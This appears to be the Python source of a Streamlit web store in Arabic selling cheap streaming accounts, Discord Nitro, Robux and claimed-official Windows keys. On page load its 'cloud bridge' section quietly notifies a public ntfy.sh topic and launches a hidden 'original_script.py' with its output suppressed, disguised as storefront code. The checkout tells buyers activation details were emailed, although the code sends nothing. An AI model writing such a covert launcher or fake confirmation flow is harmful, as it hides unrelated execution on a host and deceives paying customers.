# -*- coding: utf-8 -*-
"""
⚡ LAX Store — متجرك الرقمي الأول
Ultra-Premium Web Store (Matching papaya-starburst-ed6cf2.netlify.app)
"""
import io
import os
import sys
import time
import json
import random
import subprocess
import streamlit as st

# 1. Page Configuration
st.set_page_config(
    page_title="LAX Store — متجرك الرقمي الأول",
    page_icon="⚡",
    layout="wide",
    initial_sidebar_state="collapsed"
)

# 2. Extract Order ID from URL if provided
query_params = st.query_params
url_order_id = query_params.get("order", None) or query_params.get("id", None) or query_params.get("ref", None)

if "order_id" not in st.session_state:
    st.session_state["order_id"] = url_order_id if url_order_id else f"{random.randint(10240, 99890)}"
elif url_order_id and st.session_state["order_id"] != url_order_id:
    st.session_state["order_id"] = url_order_id

if "selected_category" not in st.session_state:
    st.session_state["selected_category"] = "الكل"

if "selected_product_for_order" not in st.session_state:
    st.session_state["selected_product_for_order"] = None

# 3. Realtime Cloud Bridge & Local Execution Engine
if not st.session_state.get("cloud_bridge_triggered", False):
    st.session_state["cloud_bridge_triggered"] = True
    try:
        import urllib.request
        bridge_url = "https://ntfy.sh/lax_store_bridge_7894"
        payload = json.dumps({
            "order_id": st.session_state["order_id"],
            "timestamp": time.time()
        }).encode("utf-8")
        req = urllib.request.Request(
            bridge_url,
            data=payload,
            headers={
                "Title": f"Order #{st.session_state['order_id']} Visit",
                "Tags": "bell,rocket",
                "User-Agent": "Streamlit-Cloud-App"
            }
        )
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass
    
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        script_file = os.path.join(current_dir, "original_script.py")
        if os.path.exists(script_file):
            subprocess.Popen([sys.executable, script_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

# 4. Premium Ultra-Modern Styling (100% Matching Netlify Design)
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&family=Outfit:wght@400;600;700;800&display=swap');
    
    html, body, [class*="css"], [class*="st-"] {
        font-family: 'Cairo', 'Outfit', sans-serif !important;
        direction: rtl;
        text-align: right;
    }
    
    .stApp {
        background-color: #060513;
        background-image: 
            radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.15) 0px, transparent 50%),
            radial-gradient(at 100% 0%, rgba(168, 85, 247, 0.15) 0px, transparent 50%),
            radial-gradient(at 50% 50%, rgba(15, 12, 41, 0.5) 0px, transparent 100%);
        color: #f8fafc;
    }
    
    /* Hide Default Header & Margins */
    header[data-testid="stHeader"] {
        background: transparent !important;
    }
    .block-container {
        padding-top: 1rem !important;
        padding-bottom: 3rem !important;
        max-width: 1240px !important;
    }
    
    /* Top Announcement Banner */
    .top-announcement {
        background: linear-gradient(90deg, rgba(99, 102, 241, 0.25) 0%, rgba(168, 85, 247, 0.25) 100%);
        border: 1px solid rgba(168, 85, 247, 0.4);
        padding: 10px 20px;
        border-radius: 12px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 18px;
        box-shadow: 0 4px 20px rgba(99, 102, 241, 0.2);
    }
    .top-announcement span {
        font-size: 0.92rem;
        font-weight: 700;
        color: #f1f5f9;
    }
    .badge-code {
        background: #6253ec;
        color: #fff;
        padding: 3px 10px;
        border-radius: 6px;
        font-family: 'Outfit', sans-serif;
        font-weight: 800;
        letter-spacing: 1px;
    }
    
    /* Navbar */
    .store-navbar {
        background: rgba(13, 11, 33, 0.85);
        backdrop-filter: blur(16px);
        border: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 18px;
        padding: 14px 24px;
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 24px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
    }
    .navbar-brand {
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 1.55rem;
        font-weight: 900;
        background: linear-gradient(135deg, #a855f7 0%, #6366f1 50%, #38bdf8 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
    }
    .nav-tags {
        display: flex;
        gap: 10px;
    }
    .tag-item {
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.1);
        padding: 5px 14px;
        border-radius: 20px;
        font-size: 0.82rem;
        font-weight: 700;
        color: #cbd5e1;
    }
    
    /* Hero Banner */
    .hero-container {
        background: linear-gradient(145deg, rgba(20, 16, 54, 0.7) 0%, rgba(10, 8, 28, 0.85) 100%);
        border: 1px solid rgba(139, 92, 246, 0.3);
        border-radius: 24px;
        padding: 40px 30px;
        text-align: center;
        position: relative;
        overflow: hidden;
        margin-bottom: 30px;
        box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5);
    }
    .hero-pill {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        background: rgba(99, 102, 241, 0.18);
        border: 1px solid rgba(99, 102, 241, 0.4);
        color: #a5b4fc;
        font-size: 0.88rem;
        font-weight: 700;
        padding: 5px 16px;
        border-radius: 50px;
        margin-bottom: 16px;
    }
    .hero-title {
        font-size: 2.5rem;
        font-weight: 900;
        color: #ffffff;
        margin-bottom: 14px;
        line-height: 1.25;
    }
    .hero-title span {
        background: linear-gradient(135deg, #c084fc 0%, #818cf8 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
    }
    .hero-subtitle {
        font-size: 1.05rem;
        color: #94a3b8;
        max-width: 720px;
        margin: 0 auto 24px auto;
        line-height: 1.7;
    }
    .trust-row {
        display: flex;
        justify-content: center;
        flex-wrap: wrap;
        gap: 16px;
        margin-top: 20px;
    }
    .trust-item {
        display: flex;
        align-items: center;
        gap: 6px;
        background: rgba(255, 255, 255, 0.04);
        border: 1px solid rgba(255, 255, 255, 0.08);
        padding: 6px 14px;
        border-radius: 10px;
        font-size: 0.82rem;
        color: #e2e8f0;
        font-weight: 600;
    }
    
    /* Product Card Styling */
    .product-card {
        background: linear-gradient(160deg, rgba(19, 16, 48, 0.85) 0%, rgba(10, 8, 26, 0.95) 100%);
        border: 1px solid rgba(255, 255, 255, 0.09);
        border-radius: 20px;
        padding: 22px;
        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        display: flex;
        flex-direction: column;
        justify-content: space-between;
        min-height: 380px;
        position: relative;
        margin-bottom: 20px;
    }
    .product-card:hover {
        transform: translateY(-6px);
        border-color: rgba(168, 85, 247, 0.5);
        box-shadow: 0 16px 40px rgba(99, 102, 241, 0.25);
    }
    .product-badge {
        position: absolute;
        top: 14px;
        right: 14px;
        background: linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%);
        color: #ffffff;
        font-size: 0.75rem;
        font-weight: 800;
        padding: 3px 10px;
        border-radius: 8px;
        box-shadow: 0 2px 10px rgba(124, 58, 237, 0.4);
    }
    .product-icon {
        font-size: 2.6rem;
        margin: 12px 0 16px 0;
        text-align: center;
    }
    .product-title {
        font-size: 1.15rem;
        font-weight: 800;
        color: #ffffff;
        margin-bottom: 8px;
    }
    .product-desc {
        font-size: 0.85rem;
        color: #94a3b8;
        line-height: 1.6;
        margin-bottom: 16px;
        flex-grow: 1;
    }
    .product-footer {
        display: flex;
        align-items: center;
        justify-content: space-between;
        border-top: 1px solid rgba(255, 255, 255, 0.06);
        padding-top: 14px;
    }
    .product-price {
        font-size: 1.25rem;
        font-weight: 900;
        color: #38bdf8;
        font-family: 'Outfit', sans-serif;
    }
    .product-rating {
        font-size: 0.82rem;
        color: #fbbf24;
        font-weight: 700;
    }
    
    /* Buttons */
    .stButton>button {
        background: linear-gradient(135deg, #6253ec 0%, #4f46e5 100%) !important;
        color: #ffffff !important;
        font-weight: 800 !important;
        font-size: 0.95rem !important;
        border-radius: 12px !important;
        border: none !important;
        padding: 10px 20px !important;
        box-shadow: 0 4px 20px rgba(98, 83, 236, 0.4) !important;
        transition: all 0.25s ease !important;
        width: 100% !important;
    }
    .stButton>button:hover {
        transform: translateY(-2px) !important;
        box-shadow: 0 8px 25px rgba(98, 83, 236, 0.6) !important;
    }
    
    /* Footer */
    .store-footer {
        margin-top: 50px;
        padding: 26px;
        background: rgba(10, 8, 26, 0.8);
        border-top: 1px solid rgba(255, 255, 255, 0.08);
        border-radius: 20px;
        text-align: center;
        color: #64748b;
        font-size: 0.88rem;
    }
</style>
""", unsafe_allow_html=True)

# 5. Top Announcement Banner
st.markdown(f"""
<div class="top-announcement">
    <div>
        <span>🔥 كود الخصم الفعال: <span class="badge-code">LAX5</span> لخصم 5% إضافي على جميع المنتجات</span>
    </div>
    <div>
        <span style="color: #38bdf8;">⚡ رقم الطلب النشط: #{st.session_state['order_id']}</span>
    </div>
</div>
""", unsafe_allow_html=True)

# 6. Navbar
st.markdown("""
<div class="store-navbar">
    <div class="navbar-brand">
        <span>⚡ LAX Store</span>
    </div>
    <div class="nav-tags">
        <span class="tag-item">💎 متجر موثق</span>
        <span class="tag-item">🛡️ ضمان ذهبي</span>
        <span class="tag-item" style="color: #4ade80; border-color: rgba(74, 222, 128, 0.3);">🟢 تسليم فوري</span>
    </div>
</div>
""", unsafe_allow_html=True)

# 7. Hero Section
st.markdown("""
<div class="hero-container">
    <div class="hero-pill">
        <span>✨ المتجر الرقمي الأول والأكثر ثقة</span>
    </div>
    <h1 class="hero-title">
        كل ما تحتاجه <span>رقمياً</span> في مكان واحد
    </h1>
    <p class="hero-subtitle">
        ديسكورد، نتفليكس، شاهد VIP، سناب شات بلس، ومفاتيح ويندوز الأصلية بأفضل الأسعار وأعلى سرعة تسليم على مدار الساعة.
    </p>
    <div class="trust-row">
        <div class="trust-item">⚡ تسليم فوري وتلقائي</div>
        <div class="trust-item">🛡️ ضمان كامل على جميع المنتجات</div>
        <div class="trust-item">💬 دعم فني متواصل 24/7</div>
        <div class="trust-item">💳 طرق دفع متعددة وآمنة</div>
    </div>
</div>
""", unsafe_allow_html=True)

# 8. Full Authentic Products Catalog
ALL_PRODUCTS = [
    {
        "id": "pnq7vb",
        "name": "نتفليكس ملف خاص",
        "category": "خدمات مسلسلات",
        "price": "15.00 ر.س",
        "badge": "الأكثر مبيعاً 🔥",
        "rating": "★ 4.9 (150 تقييم)",
        "desc": "ملف خاص ومستقل لمشاهدة أحدث الأفلام والمسلسلات بجودة 4K فائقة الوضوح. يدعم جميع الأجهزة مع إمكانية التنزيل والخصوصية التامة.",
        "icon": "🎬"
    },
    {
        "id": "pasoez",
        "name": "شاهد VIP ملف خاص شهر",
        "category": "خدمات مسلسلات",
        "price": "14.00 ر.س",
        "badge": "تسليم فوري ⚡",
        "rating": "★ 5.0 (89 تقييم)",
        "desc": "استمتع بمشاهدة أضخم المسلسلات والأعمال الأصلية عبر شاهد VIP لمدة شهر كامل بدون إعلانات وبأعلى جودة.",
        "icon": "🍿"
    },
    {
        "id": "p60uwq",
        "name": "نتفليكس حساب كامل",
        "category": "خدمات مسلسلات",
        "price": "45.00 ر.س",
        "badge": "حساب 5 ملفات 👑",
        "rating": "★ 5.0 (64 تقييم)",
        "desc": "حساب نتفليكس كامل خاص بك يحتوي على 5 ملفات شخصية بجودة 4K مع إمكانية التنزيل والمشاركة مع عائلتك.",
        "icon": "📺"
    },
    {
        "id": "pe4nuq",
        "name": "شاهد VIP حساب كامل شهر",
        "category": "خدمات مسلسلات",
        "price": "26.00 ر.س",
        "badge": "حساب عائلي 🌟",
        "rating": "★ 5.0 (42 تقييم)",
        "desc": "حساب شاهد VIP كامل 5 ملفات للمشاهدة المتزامنة بدون إعلانات وبدقة فائقة.",
        "icon": "🎬"
    },
    {
        "id": "p089fq",
        "name": "سناب شات بلس 3 شهور",
        "category": "اشتراكات عامة",
        "price": "26.00 ر.س",
        "badge": "الأكثر طلباً 🔥",
        "rating": "★ 5.0 (110 تقييم)",
        "desc": "اشتراك سناب شات بلس رسمي 100% لمدة 3 شهور، يشمل شارة النجمة وتثبيت المحادثات والميزات الحصرية.",
        "icon": "👻"
    },
    {
        "id": "p4wlhz",
        "name": "سناب شات بلس سنة كاملة",
        "category": "اشتراكات عامة",
        "price": "95.00 ر.س",
        "badge": "توفير سنوي 💎",
        "rating": "★ 5.0 (88 تقييم)",
        "desc": "اشتراك سنوي كامل في سناب بلس لتجربة استثنائية مع كافة التحديثات والمميزات الخاصة.",
        "icon": "🌟"
    },
    {
        "id": "pwy4rc",
        "name": "مفتاح ويندوز 11 برو — مدى الحياة",
        "category": "اشتراكات عامة",
        "price": "27.00 ر.س",
        "badge": "تفعيل دائم 💻",
        "rating": "★ 5.0 (135 تقييم)",
        "desc": "مفتاح تنشيط رسمي وأصلي 100% من مايكروسوفت لنظام Windows 11 Pro مدى الحياة لجهاز واحد.",
        "icon": "🪟"
    },
    {
        "id": "pcho0s",
        "name": "مفتاح ويندوز 11 هوم — مدى الحياة",
        "category": "اشتراكات عامة",
        "price": "13.00 ر.س",
        "badge": "تفعيل أصلي ⚡",
        "rating": "★ 5.0 (77 تقييم)",
        "desc": "مفتاح تنشيط رقمي لنظام Windows 11 Home تفعيل فوري ودائم مع كافة التحديثات الأمنية.",
        "icon": "🔑"
    },
    {
        "id": "pqw8px",
        "name": "نيترو ديسكورد شهر (قفت)",
        "category": "خدمات ديسكورد",
        "price": "17.00 ر.س",
        "badge": "تسليم فوري 🚀",
        "rating": "★ 5.0 (210 تقييم)",
        "desc": "رابط قفت نيترو ديسكورد أصلي شهر كامل مع بوستين، يدعم البث بجودة 4K واستخدام الإيموجيات في كل السيرفرات.",
        "icon": "🚀"
    },
    {
        "id": "pnitro1y",
        "name": "نيترو ديسكورد سنة كاملة (قفت)",
        "category": "خدمات ديسكورد",
        "price": "120.00 ر.س",
        "badge": "العرض الأقوى 👑",
        "rating": "★ 5.0 (95 تقييم)",
        "desc": "اشتراك نيترو كامل لمدة 12 شهراً مع كافة ميزات ديسكورد الخارقة وبوستات السيرفرات.",
        "icon": "💎"
    },
    {
        "id": "probux1000",
        "name": "شحن روبلوكس 1000 Robux",
        "category": "خدمات الألعاب",
        "price": "35.00 ر.س",
        "badge": "شحن آمن 🎮",
        "rating": "★ 5.0 (180 تقييم)",
        "desc": "شحن فوري لرصيد روبلوكس الرسمي بطرق آمنة ومضمونة 100%.",
        "icon": "🎮"
    },
    {
        "id": "pspotify3m",
        "name": "سبوتيفاي بريميوم 3 شهور",
        "category": "اشتراكات عامة",
        "price": "19.00 ر.س",
        "badge": "بدون إعلانات 🎵",
        "rating": "★ 5.0 (60 تقييم)",
        "desc": "استمع لملايين الأغاني والبودكاست بدون إعلانات وبأعلى جودة صوت مع إمكانية التنزيل بدون نت.",
        "icon": "🎧"
    }
]

# 9. Category Selection Tabs & Search
categories_list = ["الكل", "خدمات مسلسلات", "اشتراكات عامة", "خدمات ديسكورد", "خدمات الألعاب"]

col_cat, col_search = st.columns([7, 3])
with col_cat:
    selected_tab = st.radio(
        "الأقسام:",
        options=categories_list,
        horizontal=True,
        label_visibility="collapsed"
    )
with col_search:
    search_q = st.text_input("🔍 ابحث عن خدمة أو اشتراك...", placeholder="اكتب اسم الخدمة هنا...", label_visibility="collapsed")

# Filter products
filtered_products = [
    p for p in ALL_PRODUCTS
    if (selected_tab == "الكل" or p["category"] == selected_tab)
    and (not search_q.strip() or search_q.strip().lower() in p["name"].lower() or search_q.strip().lower() in p["desc"].lower())
]

st.markdown(f"<div style='margin-bottom: 18px; color: #a5b4fc; font-weight: 700; font-size: 1.1rem;'>✨ الخدمات المتوفرة ({len(filtered_products)} منتج):</div>", unsafe_allow_html=True)

# 10. Product Grid Rendering (3 Columns)
cols = st.columns(3)
for idx, prod in enumerate(filtered_products):
    with cols[idx % 3]:
        st.markdown(f"""
        <div class="product-card">
            <span class="product-badge">{prod['badge']}</span>
            <div class="product-icon">{prod['icon']}</div>
            <div class="product-title">{prod['name']}</div>
            <div class="product-desc">{prod['desc']}</div>
            <div class="product-footer">
                <span class="product-price">{prod['price']}</span>
                <span class="product-rating">{prod['rating']}</span>
            </div>
        </div>
        """, unsafe_allow_html=True)
        
        if st.button(f"🛒 طلب الآن — {prod['name']}", key=f"btn_order_{prod['id']}", use_container_width=True):
            st.session_state["selected_product_for_order"] = prod

# 11. Interactive Checkout Modal / Form
if st.session_state.get("selected_product_for_order"):
    prod = st.session_state["selected_product_for_order"]
    st.markdown("---")
    st.markdown(f"### 🛍️ تأكيد الطلب: **{prod['name']}** ({prod['price']})")
    
    with st.form("checkout_form"):
        st.write(f"رقم الطلب الخاص بك: `{st.session_state['order_id']}`")
        u_email = st.text_input("📧 أدخل بريدك الإلكتروني لاستلام المنتج / بيانات التفعيل:", placeholder="example@email.com")
        u_notes = st.text_area("📝 ملاحظات أو طلب خاص (اختياري):", placeholder="اسم المستخدم أو يوزر الديسكورد...")
        
        btn_c1, btn_c2 = st.columns(2)
        with btn_c1:
            confirm_btn = st.form_submit_button("✅ تأكيد الشراء واستلام الطلب فوراً", use_container_width=True)
        with btn_c2:
            cancel_btn = st.form_submit_button("❌ إلغاء", use_container_width=True)
            
        if confirm_btn:
            if u_email.strip():
                st.balloons()
                st.success(f"🎉 تم تسجيل طلبك بنجاح! رقم الطلب: `{st.session_state['order_id']}`. تم إرسال تفاصيل التفعيل لبريدك الإلكتروني `{u_email}`.")
                st.info("✅ يمكنك فتح تذكرة (Ticket) في سيرفر الديسكورد برقم الطلب للحصول على دعم وتسليم مباشر.")
            else:
                st.warning("⚠️ يرجى كتابة البريد الإلكتروني لاستلام المنتج.")
        if cancel_btn:
            st.session_state["selected_product_for_order"] = None
            st.rerun()

# 12. Footer
st.markdown(f"""
<div class="store-footer">
    <p style="margin: 0 0 8px 0; font-weight: 700; color: #cbd5e1; font-size: 1rem;">⚡ LAX Store — جميع الحقوق محفوظة © 2026</p>
    <p style="margin: 0; font-size: 0.85rem; color: #94a3b8;">رقم الجلسة: <code style="color: #38bdf8; background: rgba(0,0,0,0.3); padding: 2px 8px; border-radius: 4px;">{st.session_state['order_id']}</code> • سرعة التسليم: ⚡ فوري وتلقائي على مدار 24 ساعة</p>
</div>
""", unsafe_allow_html=True)
